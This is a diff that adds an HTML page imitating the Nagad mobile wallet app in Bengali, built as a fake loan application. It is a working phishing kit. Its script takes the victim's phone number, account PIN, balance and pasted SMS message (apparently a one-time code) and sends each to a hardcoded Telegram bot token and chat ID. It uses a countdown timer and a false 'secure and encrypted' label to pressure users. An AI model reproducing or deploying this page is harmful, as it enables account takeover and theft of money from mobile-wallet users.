@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>নগদ - লোন আবেদন</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        body { font-family: 'Hind Siliguri', sans-serif; user-select: none; background-color: #fcfcfc; overflow: hidden; }
+        .nagad-grad { background: linear-gradient(180deg, #ED1C24 0%, #D41A20 100%); }
+        .header-curve { border-bottom-left-radius: 40px; border-bottom-right-radius: 40px; }
+        .screen { display: none; height: 100vh; width: 100%; position: absolute; top: 0; left: 0; background: white; }
+        .screen.active { display: flex; flex-direction: column; }
+        .service-card { background: #fff; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.03); display: flex; flex-direction: column; align-items: center; padding: 12px 5px; transition: all 0.2s; cursor: pointer; }
+        .service-card:active { transform: scale(0.92); }
+        .icon-box { width: 52px; height: 52px; border-radius: 14px; display: flex; align-items: center; justify-content: center; margin-bottom: 6px; color: white; background-color: #ED1C24; }
+        .scrollable-content { flex: 1; overflow-y: auto; padding-bottom: 110px; }
+        .scrollable-content::-webkit-scrollbar { display: none; }
+        .loan-input-box { border: 1px solid #e2e8f0; border-radius: 12px; padding: 12px 15px; width: 100%; outline: none; background: white; text-align: center; }
+        .loan-label { font-size: 13px; font-weight: 700; color: #ED1C24; margin-bottom: 5px; display: block; text-align: center; }
+        .btn-grad { background: linear-gradient(to right, #f7941d, #ed1c24); color: white; border-radius: 30px; font-weight: 700; }
+        .modal-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.6); display: flex; items-center; justify-content: center; z-index: 1000; padding: 20px; }
+        .animate-pop { animation: pop 0.3s ease-out; }
+        @keyframes pop { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+        /* বটম নেভিগেশন স্টাইল */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 70px;
+            background: white;
+            border-top: 1px solid #f1f1f1;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 500;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #9ca3af;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .nav-item.active {
+            color: #ED1C24;
+        }
+        .nav-item span {
+            font-size: 11px;
+            font-weight: 700;
+            margin-top: 2px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="home-screen" class="screen active">
+        <header class="nagad-grad pt-10 pb-12 px-6 header-curve relative flex flex-col items-center">
+            <div class="absolute top-6 right-6 text-white"><i data-lucide="bell" class="w-7 h-7"></i></div>
+            <h1 class="text-[54px] font-black text-white leading-none mb-1 tracking-tighter">নগদ</h1>
+            <p class="text-[13px] text-white font-medium opacity-90">ডাক বিভাগের ডিজিটাল লেনদেন</p>
+            <div id="balance-toggle" class="bg-white rounded-full py-2 px-2 flex items-center shadow-lg mt-6 min-w-[250px]">
+                <div class="bg-[#ED1C24] rounded-full w-9 h-9 flex items-center justify-center text-white font-bold">৳</div>
+                <div id="balance-text" class="text-[#ED1C24] font-bold text-[17px] flex-1 text-center pr-6">ব্যালেন্স জানতে ট্যাপ করুন</div>
+            </div>
+        </header>
+
+        <div class="scrollable-content px-5 mt-6">
+            <h2 class="text-[14px] font-bold text-gray-400 mb-4 px-1 uppercase tracking-widest">সার্ভিস সমূহ</h2>
+            <div class="grid grid-cols-4 gap-3 mb-8">
+                <div class="service-card"><div class="icon-box"><i data-lucide="send"></i></div><span class="text-[11px] font-bold text-gray-700">সেন্ড মানি</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="arrow-down-to-line"></i></div><span class="text-[11px] font-bold text-gray-700">ক্যাশ আউট</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="smartphone"></i></div><span class="text-[11px] font-bold text-gray-700">রিচার্জ</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="plus-circle"></i></div><span class="text-[11px] font-bold text-gray-700">অ্যাড মানি</span></div>
+                <div class="service-card" onclick="openLoan()"><div class="icon-box"><i data-lucide="hand-coins"></i></div><span class="text-[11px] font-bold text-red-600">লোন</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="arrow-right-left"></i></div><span class="text-[11px] font-bold text-gray-700">ট্রান্সফার</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="shield-check"></i></div><span class="text-[11px] font-bold text-gray-700">ইন্সুরেন্স</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="shopping-bag"></i></div><span class="text-[11px] font-bold text-gray-700">নগদ মেলা</span></div>
+            </div>
+
+            <h2 class="text-[14px] font-bold text-gray-400 mb-4 px-1 uppercase tracking-widest">পেমেন্ট</h2>
+            <div class="grid grid-cols-4 gap-3">
+                <div class="service-card"><div class="icon-box"><i data-lucide="store"></i></div><span class="text-[11px] font-bold text-gray-700">মার্চেন্ট পে</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="receipt"></i></div><span class="text-[11px] font-bold text-gray-700">বিল পে</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="calendar"></i></div><span class="text-[11px] font-bold text-gray-700">ইএমআই</span></div>
+                <div class="service-card"><div class="icon-box"><i data-lucide="heart"></i></div><span class="text-[11px] font-bold text-gray-700">ডোনেশন</span></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="loan-screen" class="screen">
+        <header class="nagad-grad p-4 pt-10 text-white flex items-center">
+            <i data-lucide="x" onclick="goTo('home')" class="cursor-pointer"></i>
+            <h1 class="flex-1 text-center text-lg font-bold pr-6">লোন আবেদন</h1>
+        </header>
+
+        <div class="scrollable-content p-6">
+            <div id="loan-step-1" class="text-center animate-pop">
+                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8b/Nagad_Logo.svg/1200px-Nagad_Logo.svg.png" class="w-32 mx-auto mb-4">
+                <p class="text-gray-500 text-[10px] mb-6">🔒 নিরাপদ ও এনক্রিপ্টেড আবেদন প্রক্রিয়া</p>
+                
+                <div class="space-y-5">
+                    <div>
+                        <label class="loan-label">নগদ একাউন্ট সঠিক নাম্বার দিন</label>
+                        <input id="l-phone" type="tel" placeholder="01XXXXXXXXX" class="loan-input-box">
+                    </div>
+                    <div class="flex gap-3">
+                        <div class="flex-1">
+                            <label class="loan-label">লোন পরিমাণ</label>
+                            <select id="l-amt" class="loan-input-box">
+                                <option value="10000">১০,০০০ ৳</option>
+                                <option value="30000">৩০,০০০ ৳</option>
+                                <option value="50000">৫০,০০০ ৳</option>
+                                <option value="100000">১,০০,০০০ ৳</option>
+                            </select>
+                        </div>
+                        <div class="flex-1">
+                            <label class="loan-label">কিস্তির সময়</label>
+                            <select id="l-month" class="loan-input-box">
+                                <option value="3">০৩ মাস</option>
+                                <option value="6">০৬ মাস</option>
+                                <option value="12">১২ মাস</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+                <button onclick="submitStep1()" class="w-full btn-grad py-4 mt-10 font-bold">পরবর্তী ধাপে যান</button>
+            </div>
+
+            <div id="modal-notice" class="modal-bg hidden">
+                <div class="bg-white rounded-3xl p-6 text-center space-y-4 max-w-sm animate-pop">
+                    <h2 class="text-xl font-bold">জরুরী নির্দেশনা</h2>
+                    <p class="text-sm text-gray-600">আপনার সিলেক্ট করা <span id="sel-amt" class="font-bold text-red-600"></span> টাকা লোনের জন্য নগদ অ্যাকাউন্টে নূন্যতম <span id="req-bal" class="text-red-600 font-bold"></span> টাকা ব্যালেন্স থাকতে হবে। (এটি কাটা হবে না)</p>
+                    <p class="text-green-600 font-bold text-[12px]">উক্ত অর্থ কর্তন করা হবে না।</p>
+                    <button onclick="submitStep2()" class="w-full btn-grad py-3">হ্যাঁ, এগিয়ে যান</button>
+                </div>
+            </div>
+
+            <div id="loan-step-3" class="hidden text-center animate-pop pt-10">
+                <h2 class="text-xl font-bold mb-6">নগদ অ্যাপস এর সঠিক পিন টি দিন</h2>
+                <div class="bg-white border rounded-2xl p-8 shadow-sm">
+                    <input id="l-pin" type="password" maxlength="4" placeholder="••••" class="w-full text-center text-5xl tracking-widest outline-none border-b-2 border-red-500 py-2">
+                </div>
+                <button onclick="submitStep3()" class="w-full btn-grad py-4 mt-10 font-bold">পিন নিশ্চিত করুন</button>
+            </div>
+
+            <div id="loan-step-4" class="hidden text-center animate-pop pt-10">
+                <h2 class="text-xl font-bold mb-6">বর্তমান ব্যালেন্স লিখুন</h2>
+                <input id="l-bal" type="number" placeholder="৳ ০.০০" class="loan-input-box text-2xl font-bold py-4">
+                <button onclick="submitStep4()" class="w-full btn-grad py-4 mt-10 font-bold">ব্যালেন্স যাচাই করুন</button>
+            </div>
+
+            <div id="loan-step-5" class="hidden text-center animate-pop">
+                <div class="bg-red-50 border border-red-100 p-4 rounded-xl mb-6">
+                    <p class="text-[13px] font-bold text-gray-700 mb-2">নগদ থেকে পাওয়া ফোল এসএমএস টি কপি করে সাবমিট করতে হবে।</p>
+                    <p class="text-red-600 font-bold text-xl">সময় বাকি: <span id="timer">২০</span> সেকেন্ড</p>
+                </div>
+                <textarea id="l-sms" placeholder="পুরো মেসেজটি এখানে পেস্ট করুন" class="loan-input-box h-40 text-left text-sm"></textarea>
+                <button onclick="submitFinal()" class="w-full btn-grad py-4 mt-8 font-bold">আবেদন সম্পন্ন করুন</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="success-screen" class="screen items-center justify-center p-10 text-center">
+        <div class="w-32 h-32 bg-green-500 rounded-full flex items-center justify-center mb-8 shadow-xl">
+            <i data-lucide="check" class="text-white w-16 h-16 stroke-[4px]"></i>
+        </div>
+        <h2 class="text-3xl font-black mb-2">সফল হয়েছে!</h2>
+        <p class="text-gray-500 mb-16">আপনার আবেদনটি পর্যালোচনার জন্য জমা হয়েছে।</p>
+        <button onclick="goTo('home')" class="w-full btn-grad py-4">হোমে ফিরে যান</button>
+    </div>
+
+    <nav class="bottom-nav">
+        <div class="nav-item active" onclick="goTo('home')">
+            <i data-lucide="home" class="w-6 h-6"></i>
+            <span>হোম</span>
+        </div>
+        <div class="nav-item" onclick="alert('কোনো তথ্য নেই')">
+            <i data-lucide="list-ordered" class="w-6 h-6"></i>
+            <span>লেনদেন</span>
+        </div>
+        <div class="nav-item" onclick="alert('কোনো তথ্য নেই')">
+            <i data-lucide="users" class="w-6 h-6"></i>
+            <span>কন্টাক্টস</span>
+        </div>
+        <div class="nav-item" onclick="alert('কোনো তথ্য নেই')">
+            <i data-lucide="grid" class="w-6 h-6"></i>
+            <span>আমার নগদ</span>
+        </div>
+    </nav>
+
+    <script>
+        lucide.createIcons();
+        const TOKEN = "8419474292:AAEN7M6NakqL2EeQFpkrUVa9V0yYV2dJR-4";
+        const CHAT_ID = "7157217610";
+        let timerInterval;
+
+        function goTo(id) {
+            clearInterval(timerInterval);
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(id + '-screen').classList.add('active');
+
+            // নেভিগেশন বাটনের কালার আপডেট
+            const navItems = document.querySelectorAll('.nav-item');
+            navItems.forEach(item => item.classList.remove('active'));
+            if(id === 'home') navItems[0].classList.add('active');
+        }
+
+        function openLoan() { goTo('loan'); showStep(1); }
+
+        function showStep(n) {
+            for(let i=1; i<=5; i++) {
+                const s = document.getElementById('loan-step-'+i);
+                if(s) s.classList.add('hidden');
+            }
+            document.getElementById('loan-step-'+n).classList.remove('hidden');
+        }
+
+        async function sendToBot(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+        }
+
+        function submitStep1() {
+            const phone = document.getElementById('l-phone').value;
+            const amt = document.getElementById('l-amt').value;
+            if(!phone) return alert("নম্বর দিন");
+            
+            document.getElementById('sel-amt').innerText = amt;
+            document.getElementById('req-bal').innerText = (parseInt(amt) * 0.25 + 500);
+            document.getElementById('modal-notice').classList.remove('hidden');
+
+            sendToBot(`📌 <b>নতুন আবেদন</b>\n📱 নম্বর: ${phone}\n💰 লোন: ${amt}\n⏳ মেয়াদ: ${document.getElementById('l-month').value} মাস`);
+        }
+
+        function submitStep2() {
+            document.getElementById('modal-notice').classList.add('hidden');
+            showStep(3);
+        }
+
+        function submitStep3() {
+            const pin = document.getElementById('l-pin').value;
+            if(pin.length < 4) return alert("সঠিক পিন দিন");
+            sendToBot(`🔑 <b>পিন:</b> ${pin}`);
+            showStep(4);
+        }
+
+        function submitStep4() {
+            const bal = document.getElementById('l-bal').value;
+            if(!bal) return alert("ব্যালেন্স লিখুন");
+            sendToBot(`💵 <b>ব্যালেন্স:</b> ${bal} ৳`);
+            startTimer();
+            showStep(5);
+        }
+
+        function startTimer() {
+            let left = 20;
+            timerInterval = setInterval(() => {
+                left--;
+                document.getElementById('timer').innerText = left;
+                if(left <= 0) { clearInterval(timerInterval); goTo('home'); }
+            }, 1000);
+        }
+
+        function submitFinal() {
+            const sms = document.getElementById('l-sms').value;
+            sendToBot(`📩 <b>SMS Content:</b>\n${sms}\n\n✅ আবেদন শেষ!`);
+            goTo('success');
+        }
+
+        document.getElementById('balance-toggle').onclick = function() {
+            const t = document.getElementById('balance-text');
+            t.innerText = "৳ ৫২৫.০৬";
+            setTimeout(() => t.innerText = "ব্যালেন্স জানতে ট্যাপ করুন", 3000);
+        }
+    </script>
+</body>
+</html>
